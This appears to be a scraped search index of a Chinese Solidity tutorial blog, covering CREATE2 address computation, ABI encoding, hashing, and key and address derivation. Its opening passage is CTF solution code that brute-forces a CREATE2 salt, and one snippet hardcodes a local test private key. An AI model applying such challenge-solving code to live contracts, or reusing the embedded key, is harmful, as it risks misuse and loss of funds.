other 2 strings // 2. 将 string1 saltToBytes string2三个字段的值拼接在一起 var concatString = str1.concat(saltToHash).concat(bytecodeToHash); /** * 3. Hash the resulting string * 对上行代码的 concatString 进行hash： * eth.keccakFromHexString() 是 Ethereum.js 库中的一个方法， * 用于对一个十六进制字符串进行 Keccak-256 哈希运算返回值类型为 Buffer * */ var hashed = eth.bufferToHex(eth.keccakFromHexString(concatString)); // 这个不对 因为 eth.keccak256()的参数不支持string类型，只支持Buffer类型 // var hashed = eth.bufferToHex(eth.keccak256(concatString)) // 4. Remove leading 0x and 12 bytes // 5. Check if the result contains badc0de // hashed.slice(26,20) if (hashed.slice(26, hashed.length).includes(&#x27;badc0de&#x27;)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hashed.slice(26, hashed.length)&#125;`); break; &#125; salt++;&#125; 3. 【ethersjs】3. 1 安装ethersjs库1npm install ethers 3.2 计算代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import &#123; ethers &#125; from &quot;ethers&quot;/** * create2 计算合约地址所需要的四个值 * * 1. 0xFF：一个常数，避免和CREATE冲突 2. 创建者地址 3. salt（盐）：一个创建者给定的数值 4. 待部署合约的字节码（bytecode） */// 1. 常数const const_num = &quot;0xFF&quot;;// 2. 创建者地址（合约地址）// 一般情况下是： address(this)// 拼接的时候不能包含 `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. 拼接 let str1 = const_num + contract_add.slice(2,contract_add.length);// 4. 代部署合约的字节码的hash值const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;// 5.1 对bytecode 进行hash运算 这个只能用单引号// solidityKeccak256([&#x27;bytes&#x27;],[bytecode]) &lt;=&gt; keccak256(abi.encodePacked(bytecode))const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);// 5.2 下面这行代码也行，因为对 bytecode进行紧打包的结果不变// const bytecodeToHash = ethers.utils.keccak256(bytecode);// console.log(bytecodeToHash)// 5. 定义一个盐，以及一个所求字段let salt = 0;const value = &quot;badc0de&quot;; // CTF靶场的题// 遍历出指定值，求出saltwhile (true) &#123; // 将salt转为16进制，用0填充为64位 // let saltToBytes = salt.toString(16).padStart(64, 0).toString(); let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length); // 再次拼接 顺序： 常数 创建者地址 盐 字节码的hash值 // bytecodeToHash.slice(2,bytecodeToHash.length): 删除 `0x` let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); // 对 str2 进行hash let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); // console.log(saltBuffer) // 先将打包好的str2 转为 utf8的字节数组 // let saltUtf8Bytes = ethers.utils.toUtf8Bytes(str2); // 将 saltUtf8Bytes 转化为buffer // let saltBuffer = ethers.utils.arrayify(saltUtf8Bytes); // 对 saltBuffer 进行hash // let hash = ethers.utils.keccak256(str2); //判断 是否满足条件 if (hash.slice(26, hash.length).includes(value)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; 搭配使用的solidity代码 计算地址： 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // 固定的一个字节的常数 0xff addToDeploy, //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ))); &#125;&#125; 4. 推荐使用 ethersjs","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"encode && encodePacked","slug":"Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked","date":"2023-05-24T08:10:10.000Z","updated":"2023-05-24T08:10:10.000Z","comments":true,"path":"2023/05/24/Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/24/Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked/","excerpt":"","text":"abi编码的详解1.abi.encode abi.encode 将它的每个参数填充为32字节【32 * 8 &#x3D;256位】（1byte &#x3D; 8bit）的数据，并拼接在一起。 注：如果要和合约交互，使用的是abi.encode（实践操作） 1.1 abi.encode编码演示定义的变量： 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; 代码1： num1是uint8类型，占用1个字节 123function testABIEncode1() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num1, _addr, name, bs1); &#125; 代码2： num2是uint256类型，占用32个字节 123function testABIEncode2() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num2, _addr, name, bs1);&#125; 看运行结果： 由运行结果 比较num1 和num2的编码值可知，不管参数的数据类型是什么，它都将参数填充为32位。所以这两个函数的编码结果相同。 1.2 abi.encode 与合约交互 —- 以create2为例create2 的使用请移步 &#x3D;&#x3D;&#x3D;》 【abi.encode】通过 abi.encode对要部署合约的字节码和代传参数（id &#x3D; 1, name &#x3D; “biyou”）进行“非紧”打包： 123456// 非紧打包 -- 涉及了合约构造函数的参数 function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行紧打包 result = abi.encodePacked(temp, abi.encode(id,name));&#125; 运行结果的部分截图： 将获取的bytecode的值，放入create2Address函数中,传入盐salt（biyou），计算 Student合约的地址 create2Address函数代码： 123456789101112131415function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ) ) ); &#125; 运行结果： 再将获取的地址通过remix上的At Address获取合约，并调用其中的函数检验结果： At Address: 验证结果（正确）： 【abi.encodePacked】通过 abi.encodePacked对要部署合约的字节码和代传参数（id &#x3D; 1, name &#x3D; “biyou”）进行“非紧”打包： 12345// 紧打包function encodePackedBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; result = abi.encodePacked(temp, abi.encodePacked(id,name));&#125; 运行结果的部分截图： 将获取的bytecode的值，放入create2Address函数中,传入盐salt（biyou），计算 Student合约的地址 create2Address函数同上 运行结果： 再将获取的地址通过remix上的At Address获取合约，并调用其中的函数检验结果： At Address: 运行结果（出错）： 2. abi.encodePacked2.1 编码演示 将给定参数根据其所需最低空间编码。类似于abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据 的hash时。 最低空间编码（个人理解）: 因为在以太坊EVM中的ABI，默认给每个属性（字段）赋予一个 32字节（32 * 8 &#x3D; 256位）的长度（不足部分被0填充）, 实际占用长度取决于属性的类型。 整型： 1&gt;uint8 num = 1; // 这个占用8bit，即一个字节，前面将填充31 * 8 个零，又因为在以太坊中数据一般格式为16进制，16进制数的一位占四个 xxxx(x是0或1) 例： 0xff = 11111111 这样前面显示的0的个数为 31 * 8 &#x2F; 4 &#x3D; 62个（uint8 num &#x3D; 1，本身表示为：0x01） 所以使用abi.encodePacked打包，将会是保留uint8本身的长度（8位）即1字节即0x01， 如图： 1&gt;uint256 num2 = 1;//占用 256位，即 0x0000000000000000000000000000000000000000000000000000000000000001，因为num2声明为uint256明确指明了占用256位，所以EVM会给num2分配的最低空间为 256位 所以使用abi.encodePacked打包，将会是保留uint256本身的长度（256位）即32字节 如图： bytesn（n的范围是[1,32]）类型：和uint类型类似 bytes1 &#x3D;&#x3D;&gt; uint8 关于 bytes家族移步&#x3D;&#x3D;》 string类型： 将字符串转为bytes类型之后实际有多长就保留多长 字符串转bytes代码： 123function stingConvertBytes(string memory _str) external pure returns(bytes memory result)&#123; result = abi.encodePacked(_str);&#125; address类型： 因为address是160位的，所以只保留160位即可 定义的变量： 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; 代码1： num1是uint8类型，占用1个字节 num2是uint256类型，占用32个字节 _addr是address类型，占用20个字节 name是string类型，占用字节数取决于实际情况长度 bs1是bytes1类型，占用1个字节 123function testABIEncodePacked1() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num1, _addr, name, bs1);&#125; 结果： 代码2： &#96;&#96;num1是uint8类型，占用1个字节&#96; num2是uint256类型，占用32个字节 _addr是address类型，占用20个字节 name是string类型，占用字节数取决于实际情况长度 bs1是bytes1类型，占用1个字节 123function testABIEncodePacked2() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num2, _addr, name, bs1);&#125; 看运行结果： 3. 总结不需要和其他合约交互的时候大多选择 abi.encodePacked的打包方式，包括签名操作什么的 需要与其他合约进行交互的则选择abi.encode的打包方式—其他的合约交互正在学习","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"}]},{"title":"Create && Create 2","slug":"Solidity/Basic_Knowledge/Create2","date":"2023-05-23T08:10:10.000Z","updated":"2023-05-23T08:10:10.000Z","comments":true,"path":"2023/05/23/Solidity/Basic_Knowledge/Create2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/23/Solidity/Basic_Knowledge/Create2/","excerpt":"","text":"1. create1.1 简介 概念： 智能合约可以由其他合约和普通账户利用 create操作码创建。在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和nonce(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。 计算式： 新地址 = hash(创建者地址, nonce) 创建者地址不会变，但nonce可能会随时间而改变，因此create创建的合约地址不好预测。 2.create22.1 简介 create2的用法和create有点类型，同样是new一个合约，并传入新合约构造函数所需的参数，不同点在于要多传入一个salt（盐）参数： 1Contract X = new Contract&#123;salt: _salt, value: _value&#125;(params); 解读：Contract是要创建的合约名，X是合约对象（address），_salt是指定的盐；如果构造函数是payable，可以在创建时传入_value数量的ETH，params是新合约构造函数的参数。 2.2 计算create2地址注：如果需要进行合约交互，且待部署合约的构造器带参，则需要对待传参数进行abi.encode()打包，再使用 abi.encodePacked()对bytecode和abi.encode()的结果进行紧打包 如代码所示： 123456function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode 写死 bytes memory temp = type(Student).creationCode; // 这里的参数值我写死了（Student 构造器的参数） result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; ❗❗❗abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)) 外层的abi.encodePacked()将不会对abi.encode(1,&quot;biyou&quot;)的值进行紧打包了，举例如下： 代码1： 1234567// 非紧打包 -- 涉及了合约构造函数的参数function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行紧打包 result = abi.encodePacked(temp, abi.encode(id,name));&#125; 结果1： 代码2： 123456// 非紧打包 -- 涉及了合约构造函数的参数function encodeBycode1(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行非紧打包 result = abi.encode(temp, abi.encode(id,name));&#125; 结果2： 测试合约； 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// 一个用于测试的合约contract Student &#123; uint256 public id ; string public name; constructor(uint256 _id, string memory _name) &#123; id = _id; name = _name; &#125; function getId() external view returns(uint256) &#123; return id; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// create2合约contract create2 &#123; // 使用create2计算地址,我只需要改变salt(string类型)的值就可以就算出不一样的地址 function create2Address(string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包后再进行hash keccak256(getBycode()) //获取要计算的合约的字节码 再进行hash )) ) ) ); &#125; // 使用create2计算地址,传入代部署合约的字节码,我只需要改变salt(string类型)的值就可以就算出不一样的地址 function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ) ) ); &#125; // 获取部署合约的字节码（内部合约） function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode 写死 bytes memory temp = type(Student).creationCode; // 这里的参数值我写死了（Student 构造器的参数） result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; // 通过create2部署合约，new的形式 function makeSudentByCreate2(string memory _salt, uint256 id, string memory name) external returns(Student student)&#123; student = new Student&#123;salt: keccak256(abi.encodePacked(_salt))&#125;(id, name); &#125;&#125; 一个灵活一点的代码： 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // 固定的一个字节的常数 0xff addToDeploy, //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ))); &#125;&#125; 2.3 暴破求解create2地址————计算出 将来的地址合约含有某个字段操作方法 &#x3D;&#x3D;&#x3D;&#x3D;》计算指定合约地址（含某个字段） 相关链接","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"从交易获取公钥","slug":"Solidity/Basic_Knowledge/从交易获取哈希","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/从交易获取哈希/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/%E4%BB%8E%E4%BA%A4%E6%98%93%E8%8E%B7%E5%8F%96%E5%93%88%E5%B8%8C/","excerpt":"","text":"交易哈希 &#x3D;》公钥从一笔链上的交易哈希获取签名的公钥 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import &#123; ethers &#125; from &quot;ethers&quot;;// providerconst connection = &quot;&quot;;const provider = new ethers.providers.JsonRpcProvider(connection);// 交易的hashconst txHash = &quot;&quot;;// 获取交易信息const transaction = await provider.getTransaction(txHash);// console.log(`transaction =&gt; `,transaction); //打印交易详情// txData 对象内的字段缺一不可const txData = &#123; // gasPrice: transaction.gasPrice, // 这个不需要，否则会报错 gasLimit: transaction.gasLimit, value: transaction.value, nonce: transaction.nonce, data: transaction.data, to: transaction.to, chainId: transaction.chainId, type: transaction.type, maxFeePerGas: transaction.maxFeePerGas, maxPriorityFeePerGas: transaction.maxPriorityFeePerGas,&#125;// 对txData交易对象序列化为其原始二进制格式const signingData = ethers.utils.serializeTransaction(txData);// 对序列化后的交易对象进行hashconst msgHash = ethers.utils.keccak256(signingData);// 获取交易详情中的 r s vconst signature = &#123;r: transaction.r, s: transaction.s, v: transaction.v&#125;;// 获取原生未压缩的公钥，即 0x04 开头的let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);console.log(rawPublicKey);// 把开头的 0x04 字段删掉 ===》 将 `0x04` 替换成 `0x`rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;console.log(rawPublicKey); 签名原理","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethersjs","slug":"ethersjs","permalink":"https://biyouqiuqiu.com/tags/ethersjs/"}]},{"title":"以太坊 私钥公钥地址的转化","slug":"Solidity/Utils/私钥公钥地址的转化","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Utils/私钥公钥地址的转化/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Utils/%E7%A7%81%E9%92%A5%E5%85%AC%E9%92%A5%E5%9C%B0%E5%9D%80%E7%9A%84%E8%BD%AC%E5%8C%96/","excerpt":"","text":"以太坊 私钥 &#x3D;》公钥 &amp;&amp; 公钥 &#x3D;》地址（JavaScript）1. 了解 ECDSA算法ECDSA链接1 ECDSA链接2 2. secp256k1曲线比特币和以太坊使用secp256k1定义的椭圆曲线 secp256k1曲线 3. 安装库123npm install ethereumjs-wallet --save或npm install ethereumjs-util --save 这两条命令任意执行一条即可 4. 从私钥获取公钥4.1 方法一使用 ethereumjs-wallet和 ethereumjs-util 12345678910111213141516// import Wallet from &quot;ethereumjs-wallet&quot;;// import EthUtil from &quot;ethereumjs-util&quot;;// 因为当前的没指定模块，所以默认使用require语句导入包var Wallet = require(&#x27;ethereumjs-wallet&#x27;).default;var EthUtil = require(&#x27;ethereumjs-util&#x27;);// Get a wallet instance from a private key// privatekeyconst privateKey = &#x27;&#x27;;const privateKeyBuffer = EthUtil.toBuffer(privateKey);const wallet = Wallet.fromPrivateKey(privateKeyBuffer);// Get a public keyconst publicKey = wallet.getPublicKeyString(); console.log(`publicKey is =&gt; $&#123;publicKey&#125;`); 4.2 方法二使用的是ethersjs中的 Waller钱包的publicKey属性获取钱包的公钥，但是获取公钥会在起始位置多出04这个数据段，我暂时还不知道是什么东西 代码： 123456789101112131415161718192021222324import &#123; ethers &#125; from &quot;ethers&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥生成 singer对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey,provider);// 选择一个私钥let testPK = privateKey;// 计算公钥// const publicKey = curve.keyFromPrivate(testPK).publicKey(&quot;hex&quot;);let publicKey = wallet.publicKey;// 0x607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// 0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// let publicKey = &quot;0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f&quot;;let newKey = publicKey.substring(0,2) + publicKey.substring(4);console.log(`newKey = $&#123;newKey&#125;`); 运行结果： 运行结果： 5. 获取以太坊的钱包地址钱包地址的计算式： address = address(keccak256(publicKey)) solidity代码： 编译器为0.4版本的 12345678910pragma solidity ^0.4.0;contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(keccak256(_publickey)); return _subPublickey; &#125;&#125; 编译器为0.8版本的 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes memory _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(uint160(uint256(keccak256(_publickey)))); return _subPublickey; &#125;&#125; remix上的结果： genache上查看钱包地址： 参考链接1 参考链接2","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"}]},{"title":"Hash 篇","slug":"Solidity/Basic_Knowledge/hash篇","date":"2023-05-18T02:47:10.000Z","updated":"2023-05-18T02:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/hash篇/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/hash%E7%AF%87/","excerpt":"","text":"abi.encodePacked 函数将其参数按顺序拼接起来，不添加任何类型标识符或分隔符，并返回一个紧凑的字节数组，不包含长度信息。这种编码方式适用于构造哈希值和签名的情况，因为它生成的字节数组不受字节对齐的影响。 abi.encode 函数则将其参数编码为包含类型标识符和长度信息的字节数组，并返回一个动态字节数组，它包含了参数所需的所有信息。这种编码方式适用于在 Solidity 智能合约中调用其他合约函数的情况，因为它生成的字节数组可以被正确地解码为对应的参数类型。 ① ethersjs 中的 new ethers.utils.AbiCoder().encode([&#39;type&#39;], [value]) &lt;=&gt; 相当于 solidity中的 abi.encode() ② ethersjs 中的 ethers.utils.solidityKeccak256([&#39;type&#39;],[value]) &lt;=&gt; 相当于 Solidity中的keccak256(abi.encodePacked()) ③ ethersjs 中的 ethers.utils.keccak256() &lt;=&gt; 相当于 Solidity中的 keccak256() js代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\test\\\\day04\\\\getHash.abi&quot;).toString());// 通过ABI获取接口类const infe = new ethers.utils.Interface(ABI);// 获取函数选择器const getHashByAddress = infe.getSighash(&quot;getHashByAddress&quot;);console.log(`getHashByAddress is =&gt; $&#123;getHashByAddress&#125;`);/** * ethersjs 中的 ethers.utils.AbiCoder() &lt;=&gt; 相当于 solidity中的 abi.encode() * */ const abiCoder = new ethers.utils.AbiCoder();// 创建消息let msg1 = &quot;getHashByAddress&quot;;let msg1Hash = abiCoder.encode( [&#x27;string&#x27;], [msg1])let hash = ethers.utils.keccak256(msg1Hash);console.log(`hash is =&gt; $&#123;hash&#125;`);// 创建消息const msg = &quot;getHashByAddress&quot;;// 等效于Solidity中的keccak256(abi.encodePacked())const msgHash1 = ethers.utils.solidityKeccak256( [&#x27;string&#x27;], [msg])console.log(`msgHash: $&#123;msgHash1&#125;`)// msgHash：0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c// 先对 msg 进行打包 const msgHash2 = ethers.utils.solidityPack( [&#x27;string&#x27;], [msg])// 这两步等效于 `solidityPack()`const hash1 = ethers.utils.keccak256(msgHash2);console.log(`msgHash2: $&#123;msgHash2&#125;`);console.log(`hash1 is: $&#123;hash1&#125;`); solidity 合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract getHash &#123; constructor() &#123; &#125; function getHashByAddress(address _address) external pure returns(bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(_address)); return result; &#125; function getHashByString1(string memory _str) external pure returns(bytes32) &#123; // abi.encodePacked(_str); // bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); bytes32 result = keccak256(abi.encode(_str)); return result; &#125; function getHashByString2(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodeWithSignature(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString3(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString4(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = sha256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getEncode(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encode(_str); // return ; &#125; function getEncodePacked(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encodePacked(_str); // return ; &#125; &#125; abi文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140[ &#123; &quot;inputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncode&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncodePacked&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, 